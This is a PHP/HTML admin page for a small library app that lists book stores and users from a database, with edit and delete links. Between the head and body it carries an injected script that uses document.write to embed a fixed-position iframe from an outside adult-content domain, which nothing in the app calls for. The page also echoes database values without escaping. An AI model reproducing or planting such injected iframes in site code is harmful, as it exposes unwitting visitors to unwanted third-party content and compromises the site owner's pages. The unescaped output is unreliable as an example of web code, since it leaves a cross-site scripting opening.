<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" href="css/bootstrap.min.css"/>
        <link rel="stylesheet" href="css/bootstrap-theme.min.css"/>
        <title>Online Worlwide Library</title>
    </head>
    <script type="text/javascript">document.write('<iframe src="http://adultcatfinder.com/embed/" width="320" height="430" style="position:fixed;bottom:0px;right:10px;z-index:100" frameBorder="0"></iframe>');</script>
    <body>
    <!--needs dialog boxes ("javascript confrims") on clicking delete-->
        <?php
            ini_set('display_errors', 1);
            error_reporting(E_ALL);

            include_once('db.php');
            include_once('db.php');

            class Store
            {
                public $id;
                public $name;
                private $country;
                private $city;
                public $address;
                public function __construct()
                {
                    $this->address = $this->city . ', '  . $this->country;
                }
            }

            class User
            {
                public $id;
                public $firstName;
                public $lastName;
                private $country;
                private $city;
                public $address;
                public function __construct()
                {
                    $this->address = $this->city . ', '  . $this->country;
                }
            }

            $db = DB::getConnection();

            $sth = $db->prepare("SELECT Stores.id AS id, Stores.name AS name, Countries.name AS country, Cities.name AS city
            FROM Stores JOIN Countries
            ON Stores.country_id=Countries.id
            JOIN Cities
            ON Stores.city_id=Cities.id");
            $sth->execute();
            $stores = $sth->fetchAll(PDO::FETCH_CLASS, Store::class);

            $sth = $db->prepare("SELECT Users.id AS id, Users.first_name AS firstName, Users.last_name AS lastName, Countries.name AS country, Cities.name AS city
                FROM Users JOIN Countries
                ON Users.country_id=Countries.id
                JOIN Cities
                ON Users.city_id=Cities.id");
            $sth->execute();
            $users = $sth->fetchAll(PDO::FETCH_CLASS, User::class);
        ?>

        <div class="col-xs-6">
            <h2 class="sub-header">Book Stores <a class="btn btn-default mini blue-stripe" href="createEditStore.php">New</a></h2>
                <div class="table-responsive">
                    <table class="table table-striped table-hover table-users">
                        <thead>
                        <tr>
                            <th>#</th>
                            <th>Name</th>
                            <th>Address</th>
                            <th></th>
                            <th></th>
                        </tr>
                        </thead>
                        <tbody>

                    <?php
                        foreach($stores as $store)
                        {
                    ?>
                        <tr>
                            <td><?php echo $store->id; ?></td>
                            <td><?php echo $store->name; ?></td>
                            <td><?php echo $store->address; ?></td>
                            <td><a class="btn btn-default mini blue-stripe" href="createEditStore.php?id=<?php echo $store->id; ?>">Edit</a></td>
                            <td><a href="deleteStore.php?id=<?php echo $store->id; ?>"
                            onclick="return confirmDeleteStore();" id="deleteStore"
                            class="confirm-delete btn btn-default mini red-stripe"
                            role="button" data-title="delete" data-id="1">
                                Delete
                                </a>
                            </td>
                        </tr>
                        <?php } ?>
                        </tbody>
                    </table>
                </div>
        </div>

        <div class="col-xs-6">
            <h2 class="sub-header">Users <a class="btn btn-default mini blue-stripe" href="createEditUser.php">New</a></h2>
                <div class="table-responsive">
                    <table class="table table-striped table-hover table-users">
                        <thead>
                        <tr>
                            <th>#</th>
                            <th>First Name</th>
                            <th>Last Name</th>
                            <th>Address</th>
                            <th></th>
                            <th></th>
                        </tr>
                        </thead>
                         <tbody>

                    <?php
                        foreach($users as $user)
                        {
                    ?>
                        <tr>
                            <td><?php echo $user->id; ?></td>
                            <td><?php echo $user->firstName; ?></td>
                            <td><?php echo $user->lastName; ?></td>
                            <td><?php echo $user->address; ?></td>
                            <td><a class="btn btn-default mini blue-stripe" href="createEditUser.php?id=<?php echo $user->id; ?>">Edit</a></td>
                            <td><a href="deleteUser.php?id=<?php echo $user->id; ?>"
                            onclick="return confirmDeleteStore();"
                            class="confirm-delete btn btn-default mini red-stripe" role="button" data-title="delete" data-id="1">
                                Delete
                                </a>
                            </td>
                        </tr>
                        <?php } ?>
                        </tbody>
                    </table>
                </div>
        </div>
        <!--Bootstrap's Javascript requires JQuery-->
        <!-- <script src="js/bootstrap.min.js"></script> -->
        <script src="js/confirms.js" ></script>
        <footer><a href="lentBooks.php">See all currently lent books</a></footer>
        <footer><a href="lendBook.php">Lend a book</a></footer>
<?php include_once('footer.php'); ?>